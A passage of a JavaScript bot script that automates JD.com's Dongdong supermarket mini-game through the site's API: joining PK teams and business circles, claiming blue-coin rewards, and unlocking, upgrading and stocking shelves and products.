          Teams = $.updatePkActivityIdRes['Teams'] || Teams;
          if ($.getTeams && $.getTeams.length) {
            Teams = [...Teams, ...$.getTeams.filter(item => item['pkActivityId'] === `${pkActivityId}`)];
          }
          const randomNum = randomNumber(0, Teams.length);

          const res = await smtg_joinPkTeam(Teams[randomNum] && Teams[randomNum].teamId, Teams[randomNum] && Teams[randomNum].inviteCode, pkActivityId);
          if (res && res.data.bizCode === 0) {
            console.log(`加入战队成功`)
          } else if (res && res.data.bizCode === 229) {
            console.log(`加入战队失败,该战队已满\n无法加入`)
          } else {
            console.log(`加入战队其他未知情况:${JSON.stringify(res)}`)
          }
        } else {
          console.log('\nupdatePkActivityId请求返回的pkActivityId与京东服务器返回不一致,暂时不加入战队')
        }
      }
    } else if (joinStatus === 1) {
      if (teamId) {
        console.log(`inviteCode: [${inviteCode}]`);
        console.log(`PK队伍teamId: [${teamId}]`);
        console.log(`PK队伍名称: [${currentUserPkInfo && currentUserPkInfo.teamName}]`);
        console.log(`我邀请的人数:${inviteCount}\n`)
        console.log(`\n我方战队战队 [${currentUserPkInfo && currentUserPkInfo.teamName}]/【${currentUserPkInfo && currentUserPkInfo.teamCount}】`);
        console.log(`对方战队战队 [${pkUserPkInfo && pkUserPkInfo.teamName}]/【${pkUserPkInfo && pkUserPkInfo.teamCount}】\n`);
      }
    }
    if (pkStatus === 1) {
      console.log(`商圈PK进行中\n`)
      if (!teamId) {
        const receivedPkTeamPrize = await smtg_receivedPkTeamPrize();
        console.log(`商圈PK奖励领取结果：${JSON.stringify(receivedPkTeamPrize)}\n`)
        if (receivedPkTeamPrize.data.bizCode === 0) {
          if (receivedPkTeamPrize.data.result.pkResult === 1) {
            const { pkTeamPrizeInfoVO } = receivedPkTeamPrize.data.result;
            message += `【商圈PK奖励】${pkTeamPrizeInfoVO.blueCoin}蓝币领取成功\n`;
            if ($.isNode()) {
              await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `【京东账号${$.index}】 ${$.nickName}\n【商圈队伍】PK获胜\n【奖励】${pkTeamPrizeInfoVO.blueCoin}蓝币领取成功`)
            }
          } else if (receivedPkTeamPrize.data.result.pkResult === 2) {
            if ($.isNode()) {
              await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `【京东账号${$.index}】 ${$.nickName}\n【商圈队伍】PK失败`)
            }
          }
        }
      }
    } else if (pkStatus === 2) {
      console.log(`商圈PK结束了`)
      if (prizeInfo.pkPrizeStatus === 2) {
        console.log(`开始领取商圈PK奖励`);
        // const receivedPkTeamPrize = await smtg_receivedPkTeamPrize();
        // console.log(`商圈PK奖励领取结果：${JSON.stringify(receivedPkTeamPrize)}`)
        // if (receivedPkTeamPrize.data.bizCode === 0) {
        //   if (receivedPkTeamPrize.data.result.pkResult === 1) {
        //     const { pkTeamPrizeInfoVO } = receivedPkTeamPrize.data.result;
        //     message += `【商圈PK奖励】${pkTeamPrizeInfoVO.blueCoin}蓝币领取成功\n`;
        //     if ($.isNode()) {
        //       await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `【京东账号${$.index}】 ${$.nickName}\n【商圈队伍】PK获胜\n【奖励】${pkTeamPrizeInfoVO.blueCoin}蓝币领取成功`)
        //     }
        //   } else if (receivedPkTeamPrize.data.result.pkResult === 2) {
        //     if ($.isNode()) {
        //       await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `【京东账号${$.index}】 ${$.nickName}\n【商圈队伍】PK失败`)
        //     }
        //   }
        // }
      } else if (prizeInfo.pkPrizeStatus === 1) {
        console.log(`商圈PK奖励已经领取\n`)
      }
    } else if (pkStatus === 3) {
      console.log(`商圈PK暂停中\n`)
    }
  } else {
    console.log(`\n${JSON.stringify(smtg_getTeamPkDetailInfoRes)}\n`)
  }
  return
  const businessCirclePKDetailRes = await smtg_businessCirclePKDetail();
  if (businessCirclePKDetailRes && businessCirclePKDetailRes.data.bizCode === 0) {
    const { businessCircleVO, otherBusinessCircleVO, inviteCode, pkSettleTime } = businessCirclePKDetailRes.data.result;
    console.log(`\n【您的商圈inviteCode互助码】：\n${inviteCode}\n\n`);
    const businessCircleIndexRes = await smtg_businessCircleIndex();
    const { result } = businessCircleIndexRes.data;
    const { pkPrizeStatus, pkStatus  } = result;
    if (pkPrizeStatus === 2) {
      console.log(`开始领取商圈PK奖励`);
      const getPkPrizeRes = await smtg_getPkPrize();
      console.log(`商圈PK奖励领取结果：${JSON.stringify(getPkPrizeRes)}`)
      if (getPkPrizeRes.data.bizCode === 0) {
        const { pkPersonPrizeInfoVO, pkTeamPrizeInfoVO } = getPkPrizeRes.data.result;
        message += `【商圈PK奖励】${pkPersonPrizeInfoVO.blueCoin + pkTeamPrizeInfoVO.blueCoin}蓝币领取成功\n`;
      }
    }
    console.log(`我方商圈人气值/对方商圈人气值：${businessCircleVO.hotPoint}/${otherBusinessCircleVO.hotPoint}`);
    console.log(`我方商圈成员数量/对方商圈成员数量：${businessCircleVO.memberCount}/${otherBusinessCircleVO.memberCount}`);
    message += `【我方商圈】${businessCircleVO.memberCount}/${businessCircleVO.hotPoint}\n`;
    message += `【对方商圈】${otherBusinessCircleVO.memberCount}/${otherBusinessCircleVO.hotPoint}\n`;
    // message += `【我方商圈人气值】${businessCircleVO.hotPoint}\n`;
    // message += `【对方商圈人气值】${otherBusinessCircleVO.hotPoint}\n`;
    businessCircleJump = $.getdata('jdBusinessCircleJump') ? $.getdata('jdBusinessCircleJump') : businessCircleJump;
    if ($.isNode() && process.env.jdBusinessCircleJump) {
      businessCircleJump = process.env.jdBusinessCircleJump;
    }
    if (`${businessCircleJump}` === 'false') {
      console.log(`\n小于对方300热力值自动更换商圈队伍: 您设置的是禁止自动更换商圈队伍\n`);
      return
    }
    if (otherBusinessCircleVO.hotPoint - businessCircleVO.hotPoint > 300 && (Date.now() > (pkSettleTime - 24 * 60 * 60 * 1000))) {
      //退出该商圈
      if (inviteCode === '-4msulYas0O2JsRhE-2TA5XZmBQ') return;
      console.log(`商圈PK已过1天，对方商圈人气值还大于我方商圈人气值300，退出该商圈重新加入`);
      await smtg_quitBusinessCircle();
    } else if (otherBusinessCircleVO.hotPoint > businessCircleVO.hotPoint && (Date.now() > (pkSettleTime - 24 * 60 * 60 * 1000 * 2))) {
      //退出该商圈
      if (inviteCode === '-4msulYas0O2JsRhE-2TA5XZmBQ') return;
      console.log(`商圈PK已过2天，对方商圈人气值还大于我方商圈人气值，退出该商圈重新加入`);
      await smtg_quitBusinessCircle();
    }
  } else if (businessCirclePKDetailRes && businessCirclePKDetailRes.data.bizCode === 222) {
    console.log(`${businessCirclePKDetailRes.data.bizMsg}`);
    console.log(`开始领取商圈PK奖励`);
    const getPkPrizeRes = await smtg_getPkPrize();
    console.log(`商圈PK奖励领取结果：${JSON.stringify(getPkPrizeRes)}`)
    if (getPkPrizeRes && getPkPrizeRes.data.bizCode === 0) {
      const { pkPersonPrizeInfoVO, pkTeamPrizeInfoVO } = getPkPrizeRes.data.result;
      $.msg($.name, '', `【京东账号${$.index}】 ${$.nickName}\n【商圈PK奖励】${pkPersonPrizeInfoVO.blueCoin + pkTeamPrizeInfoVO.blueCoin}蓝币领取成功`)
      if ($.isNode()) {
        await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `【京东账号${$.index}】 ${$.nickName}\n【商圈PK奖励】${pkPersonPrizeInfoVO.blueCoin + pkTeamPrizeInfoVO.blueCoin}蓝币领取成功`)
      }
    }
  } else if (businessCirclePKDetailRes && businessCirclePKDetailRes.data.bizCode === 206) {
    console.log(`您暂未加入商圈,现在给您加入LXK9301的商圈`);
    const joinBusinessCircleRes = await smtg_joinBusinessCircle(myCircleId);
    console.log(`参加商圈结果：${JSON.stringify(joinBusinessCircleRes)}`)
    if (joinBusinessCircleRes.data.bizCode !== 0) {
      console.log(`您加入LXK9301的商圈失败，现在给您随机加入一个商圈`);
      const BusinessCircleList = await smtg_getBusinessCircleList();
      if (BusinessCircleList.data.bizCode === 0) {
        const { businessCircleVOList } = BusinessCircleList.data.result;
        const { circleId } = businessCircleVOList[randomNumber(0, businessCircleVOList.length)];
        const joinBusinessCircleRes = await smtg_joinBusinessCircle(circleId);
        console.log(`随机加入商圈结果：${JSON.stringify(joinBusinessCircleRes)}`)
      }
    }
  } else {
    console.log(`访问商圈详情失败：${JSON.stringify(businessCirclePKDetailRes)}`);
  }
}
//我的货架
async function myProductList() {
  const shelfListRes = await smtg_shelfList();
  if (shelfListRes.data.bizCode === 0) {
    const { shelfList } = shelfListRes.data.result;
    console.log(`\n货架数量:${shelfList && shelfList.length}`)
    for (let item of shelfList) {
      console.log(`\nshelfId/name : ${item.shelfId}/${item.name}`);
      console.log(`货架等级 level ${item.level}/${item.maxLevel}`);
      console.log(`上架状态 groundStatus ${item.groundStatus}`);
      console.log(`解锁状态 unlockStatus ${item.unlockStatus}`);
      console.log(`升级状态 upgradeStatus ${item.upgradeStatus}`);
      if (item.unlockStatus === 0) {
        console.log(`${item.name}不可解锁`)
      } else if (item.unlockStatus === 1) {
        console.log(`${item.name}可解锁`);
        await smtg_unlockShelf(item.shelfId);
      } else if (item.unlockStatus === 2) {
        console.log(`${item.name}已经解锁`)
      }
      if (item.groundStatus === 1) {
        console.log(`${item.name}可上架`);
        const productListRes = await smtg_shelfProductList(item.shelfId);
        if (productListRes.data.bizCode === 0) {
          const { productList } = productListRes.data.result;
          if (productList && productList.length > 0) {
            // 此处限时商品未分配才会出现
            let limitTimeProduct = [];
            for (let item of productList) {
              if (item.productType === 2) {
                limitTimeProduct.push(item);
              }
            }
            if (limitTimeProduct && limitTimeProduct.length > 0) {
              //上架限时商品
              await smtg_ground(limitTimeProduct[0].productId, item.shelfId);
            } else {
              await smtg_ground(productList[productList.length - 1].productId, item.shelfId);
            }
          } else {
            console.log("无可上架产品");
            await unlockProductByCategory(item.shelfId.split('-')[item.shelfId.split('-').length - 1])
          }
        }
      } else if (item.groundStatus === 2 || item.groundStatus === 3) {
        if (item.productInfo.productType === 2) {
          console.log(`[${item.name}][限时商品]`)
        } else if (item.productInfo.productType === 1){
          console.log(`[${item.name}]`)
        } else {
          console.log(`[${item.name}][productType:${item.productInfo.productType}]`)
        }
      }
    }
  }
}
//根据类型解锁一个商品,货架可上架商品时调用
async function unlockProductByCategory(category) {
  const smtgProductListRes = await smtg_productList();
  if (smtgProductListRes.data.bizCode === 0) {
    let productListByCategory = [];
    const { productList } = smtgProductListRes.data.result;
    for (let item of productList) {
      if (item['unlockStatus'] === 1 && item['shelfCategory'].toString() === category) {
        productListByCategory.push(item);
      }
    }
    if (productListByCategory && productListByCategory.length > 0) {
      console.log(`待解锁的商品数量:${productListByCategory.length}`);
      await smtg_unlockProduct(productListByCategory[productListByCategory.length - 1]['productId']);
    } else {
      console.log("该类型商品暂时无法解锁");
    }
  }
}
//升级货架和商品
async function upgrade() {
  superMarketUpgrade = $.getdata('jdSuperMarketUpgrade') ? $.getdata('jdSuperMarketUpgrade') : superMarketUpgrade;
  if ($.isNode() && process.env.SUPERMARKET_UPGRADE) {
    superMarketUpgrade = process.env.SUPERMARKET_UPGRADE;
  }
  if (`${superMarketUpgrade}` === 'false') {
    console.log(`\n自动升级: 您设置的是关闭自动升级\n`);
    return
  }
  console.log(`\n*************开始检测升级商品，如遇到商品能解锁，则优先解锁***********`)
  console.log('目前没有平稳升级,只取倒数几个商品进行升级,普通货架取倒数4个商品,冰柜货架取倒数3个商品,水果货架取倒数2个商品')
  const smtgProductListRes = await smtg_productList();
  if (smtgProductListRes.data.bizCode === 0) {
    let productType1 = [], shelfCategory_1 = [], shelfCategory_2 = [], shelfCategory_3 = [];
    const { productList } = smtgProductListRes.data.result;
    for (let item of productList) {
      if (item['productType'] === 1) {
        productType1.push(item);
      }
    }
    for (let item2 of productType1) {
      if (item2['shelfCategory'] === 1) {
        shelfCategory_1.push(item2);
      }
      if (item2['shelfCategory'] === 2) {
        shelfCategory_2.push(item2);
      }
      if (item2['shelfCategory'] === 3) {
        shelfCategory_3.push(item2);
      }
    }
    shelfCategory_1 = shelfCategory_1.slice(-4);
    shelfCategory_2 = shelfCategory_2.slice(-3);
    shelfCategory_3 = shelfCategory_3.slice(-2);
    const shelfCategorys = shelfCategory_1.concat(shelfCategory_2).concat(shelfCategory_3);
    console.log(`\n商品名称       归属货架     目前等级    解锁状态    可升级状态`)
    for (let item of shelfCategorys) {
      console.log(`  ${item["name"].length<3?item["name"]+`\xa0`:item["name"]}       ${item['shelfCategory'] === 1 ? '普通货架' : item['shelfCategory'] === 2 ? '冰柜货架' : item['shelfCategory'] === 3 ? '水果货架':'未知货架'}       ${item["unlockStatus"] === 0 ? '---' : item["level"]+'级'}     ${item["unlockStatus"] === 0 ? '未解锁' : '已解锁'}      ${item["upgradeStatus"] === 1 ? '可以升级' : item["upgradeStatus"] === 0 ? '不可升级':item["upgradeStatus"]}`)
    }
    shelfCategorys.sort(sortSyData);
    for (let item of shelfCategorys) {
      if (item['unlockStatus'] === 1) {
        console.log(`\n开始解锁商品：${item['name']}`)
        await smtg_unlockProduct(item['productId']);
        break;
      }
      if (item['upgradeStatus'] === 1) {
        console.log(`\n开始升级商品：${item['name']}`)
        await smtg_upgradeProduct(item['productId']);
        break;
      }
    }
  }
  console.log('\n**********开始检查能否升级货架***********');
  const shelfListRes = await smtg_shelfList();
  if (shelfListRes.data.bizCode === 0) {
    const { shelfList } = shelfListRes.data.result;
    let shelfList_upgrade = [];
    for (let item of shelfList) {
      if (item['upgradeStatus'] === 1) {
        shelfList_upgrade.push(item);
      }
    }
    console.log(`待升级货架数量${shelfList_upgrade.length}个`);
    if (shelfList_upgrade && shelfList_upgrade.length > 0) {
      shelfList_upgrade.sort(sortSyData);
      console.log("\n可升级货架名         等级     升级所需金币");
      for (let item of shelfList_upgrade) {
        console.log(` [${item["name"]}]         ${item["level"]}/${item["maxLevel"]}         ${item["upgradeCostGold"]}`);
      }
      console.log(`开始升级[${shelfList_upgrade[0].name}]货架，当前等级${shelfList_upgrade[0].level}，所需金币${shelfList_upgrade[0].upgradeCostGold}\n`);
      await smtg_upgradeShelf(shelfList_upgrade[0].shelfId);
    }
  }
}
async function manageProduct() {
  console.log(`安排上货(单价最大商品)`);
  const shelfListRes = await smtg_shelfList();
  if (shelfListRes.data.bizCode === 0) {
    const { shelfList } = shelfListRes.data.result;
    console.log(`我的货架数量:${shelfList && shelfList.length}`);
    let shelfListUnlock = [];//可以上架的货架
    for (let item of shelfList) {
      if (item['groundStatus'] === 1 || item['groundStatus'] === 2) {
        shelfListUnlock.push(item);
      }
    }
    for (let item of shelfListUnlock) {
      const productListRes = await smtg_shelfProductList(item.shelfId);//查询该货架可以上架的商品
      if (productListRes.data.bizCode === 0) {
        const { productList } = productListRes.data.result;
        let productNow = [], productList2 = [];
        for (let item1 of productList) {
          if (item1['groundStatus'] === 2) {
            productNow.push(item1);
          }
          if (item1['productType'] === 1) {
            productList2.push(item1);
          }
        }
        // console.log(`productNow${JSON.stringify(productNow)}`)
        // console.log(`productList2${JSON.stringify(productList2)}`)
        if (productList2 && productList2.length > 0) {
          productList2.sort(sortTotalPriceGold);
          // console.log(productList2)
          if (productNow && productNow.length > 0) {
            if (productList2.slice(-1)[0]['productId'] === productNow[0]['productId']) {
              console.log(`货架[${item.shelfId}]${productNow[0]['name']}已上架\n`)
              continue;
            }
          }
          await smtg_ground(productList2.slice(-1)[0]['productId'], item['shelfId'])
        }
      }
    }
  }
}
async function limitTimeProduct() {
  const smtgProductListRes = await smtg_productList();
  if (smtgProductListRes.data.bizCode === 0) {
    const { productList } = smtgProductListRes.data.result;
    let productList2 = [];
    for (let item of productList) {
      if (item['productType'] === 2 && item['groundStatus'] === 1) {
        //未上架并且限时商品
        console.log(`出现限时商品[${item.name}]`)
        productList2.push(item);
      }
    }
    if (productList2 && productList2.length > 0) {
      for (let item2 of productList2) {
        const { shelfCategory } = item2;
        const shelfListRes = await smtg_shelfList();
        if (shelfListRes.data.bizCode === 0) {
          const { shelfList } = shelfListRes.data.result;
          let shelfList2 = [];
          for (let item3 of shelfList) {
            if (item3['shelfCategory'] === shelfCategory && (item3['groundStatus'] === 1 || item3['groundStatus'] === 2)) {
              shelfList2.push(item3['shelfId']);
            }
          }
          if (shelfList2 && shelfList2.length > 0) {
            const groundRes = await smtg_ground(item2['productId'], shelfList2.slice(-1)[0]);
            if (groundRes.data.bizCode === 0) {
              console.log(`限时商品上架成功`);
              message += `【限时商品】上架成功\n`;
            }
          }
        }
      }
    } else {
      console.log(`限时商品已经上架或暂无限时商品`);
    }
  }
}
//领取店铺升级的蓝币奖励
async function receiveUserUpgradeBlue() {
  $.receiveUserUpgradeBlue = 0;
  if ($.userUpgradeBlueVos && $.userUpgradeBlueVos.length > 0) {
    for (let item of $.userUpgradeBlueVos) {
      const receiveCoin = await smtgReceiveCoin({ "id": item.id, "type": 5 })
      // $.log(`\n${JSON.stringify(receiveCoin)}`)
      if (receiveCoin && receiveCoin.data['bizCode'] === 0) {
        $.receiveUserUpgradeBlue += receiveCoin.data.result['receivedBlue']
      }
    }
    $.log(`店铺升级奖励获取:${$.receiveUserUpgradeBlue}蓝币\n`)
  }
  const res = await smtgReceiveCoin({"type": 4, "channel": "18"})
  // $.log(`${JSON.stringify(res)}\n`)
  if (res && res.data['bizCode'] === 0) {
    console.log(`\n收取营业额：获得 ${res.data.result['receivedTurnover']}\n`);
  }
}
async function Home() {
  const homeRes = await smtgHome();
  if (homeRes && homeRes.data['bizCode'] === 0) {
    const { result } = homeRes.data;
    const { shopName, totalBlue } = result;
    subTitle = shopName;
    message += `【总蓝币】${totalBlue}个\n`;
  }
}
//=============================================脚本使用到的京东API=====================================

//===新版本

//查询有哪些货架
function smtg_shopIndex() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_shopIndex', { "channel": 1 }), async (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
          if (data && data.data['bizCode'] === 0) {
            const { shopId, shelfList, merchandiseList, level } = data.data['result'];
            message += `【店铺等级】${level}\n`;
            if (shelfList && shelfList.length > 0) {
              for (let item of shelfList) {
                //status: 2可解锁,1可升级,-1不可解锁
                if (item['status'] === 2) {
                  $.log(`${item['name']}可解锁\n`)
                  await smtg_shelfUnlock({ shopId, "shelfId": item['id'], "channel": 1 })
                } else if (item['status'] === 1) {
                  $.log(`${item['name']}可升级\n`)
                  await smtg_shelfUpgrade({ shopId, "shelfId": item['id'], "channel": 1, "targetLevel": item['level'] + 1 });
                } else if (item['status'] === -1) {
                  $.log(`[${item['name']}] 未解锁`)
                } else if (item['status'] === 0) {
                  $.log(`[${item['name']}] 已解锁，当前等级：${item['level']}级`)
                } else {
                  $.log(`未知店铺状态(status)：${item['status']}\n`)
                }
              }
            }
            if (data.data['result']['forSaleMerchandise']) {
              $.log(`\n限时商品${data.data['result']['forSaleMerchandise']['name']}已上架`)
            } else {
              if (merchandiseList && merchandiseList.length > 0) {
                for (let  item of merchandiseList) {
                  console.log(`发现限时商品${item.name}\n`);
                  await smtg_sellMerchandise({"shopId": shopId,"merchandiseId": item['id'],"channel":"18"})
                }
              }
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//解锁店铺
function smtg_shelfUnlock(body) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_shelfUnlock', body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          $.log(`解锁店铺结果:${data}\n`)
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_shelfUpgrade(body) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_shelfUpgrade', body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          $.log(`店铺升级结果:${data}\n`)
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//售卖限时商品API
function smtg_sellMerchandise(body) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_sellMerchandise', body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          $.log(`限时商品售卖结果:${data}\n`)
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//新版东东超市
function updatePkActivityId(url = 'https://raw.githubusercontent.com/LXK9301/updateTeam/master/jd_updateTeam.json') {
  return new Promise(resolve => {
    $.get({url}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          // console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          $.updatePkActivityIdRes = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function updatePkActivityIdCDN(url) {
  return new Promise(async resolve => {
    const headers = {
      "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
    }
    $.get({ url, headers, timeout: 10000, }, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          $.updatePkActivityIdRes = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
    await $.wait(10000)
    resolve();
  })
}
function smtgDoShopTask(taskId, itemId) {
  return new Promise((resolve) => {
    const body = {
      "taskId": taskId,
      "channel": "18"
    }
    if (itemId) {
      body.itemId = itemId;
    }
    $.get(taskUrl('smtg_doShopTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtgObtainShopTaskPrize(taskId) {
  return new Promise((resolve) => {
    const body = {
      "taskId": taskId
    }
    $.get(taskUrl('smtg_obtainShopTaskPrize', body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtgQueryShopTask() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_queryShopTask'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtgSignList() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_signList', { "channel": "18" }), (err, resp, data) => {
      try {
        // console.log('ddd----ddd', data)
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//查询商圈任务列表
function smtgQueryPkTask() {
  return new Promise( (resolve) => {
    $.get(taskUrl('smtg_queryPkTask'), async (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
          if (data.code === 0) {
            if (data.data.bizCode === 0) {
              const { taskList } = data.data.result;
              console.log(`\n 商圈任务     状态`)
              for (let item of taskList) {
                if (item.taskStatus === 1) {
                  if (item.prizeStatus === 1) {
                    //任务已做完，但未领取奖励， 现在为您领取奖励
                    await smtgObtainPkTaskPrize(item.taskId);
                  } else if (item.prizeStatus === 0) {
                    console.log(`[${item.title}] 已做完 ${item.finishNum}/${item.targetNum}`);
                  }
                } else {
                  console.log(`[${item.title}] 未做完 ${item.finishNum}/${item.targetNum}`)
                  if (item.content) {
                    const { itemId } = item.content[item.type];
                    console.log('itemId', itemId)
                    await smtgDoPkTask(item.taskId, itemId);
                  }
                }
              }
            } else {
              console.log(`${data.data.bizMsg}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//PK邀请好友
function smtgDoAssistPkTask(code) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_doAssistPkTask', {"inviteCode": code}), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtgReceiveCoin(body) {
  $.goldCoinData = {};
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_receiveCoin', body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//领取PK任务做完后的奖励
function smtgObtainPkTaskPrize(taskId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_obtainPkTaskPrize', {"taskId": taskId}), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtgDoPkTask(taskId, itemId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_doPkTask', {"taskId": taskId, "itemId": itemId}), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_joinPkTeam(teamId, inviteCode, sharePkActivityId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_joinPkTeam', { teamId, inviteCode, "channel": "3", sharePkActivityId }), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_getTeamPkDetailInfo() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_getTeamPkDetailInfo'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_businessCirclePKDetail() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_businessCirclePKDetail'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_getBusinessCircleList() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_getBusinessCircleList'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//加入商圈API
function smtg_joinBusinessCircle(circleId) {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_joinBusinessCircle', { circleId }), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_businessCircleIndex() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_businessCircleIndex'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_receivedPkTeamPrize() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_receivedPkTeamPrize', {"channel": "1"}), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
//领取商圈PK奖励
function smtg_getPkPrize() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_getPkPrize'), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东超市: API查询请求失败 ‼️‼️')
          console.log(JSON.stringify(err));
        } else {
          data = JSON.parse(data);
        }
      } catch (e) {
        $.logErr(e, resp);
      } finally {
        resolve(data);
      }
    })
  })
}
function smtg_quitBusinessCircle() {
  return new Promise((resolve) => {
    $.get(taskUrl('smtg_quitBusinessCircle'), (err, resp, data) => {
      try {
        if (err) {
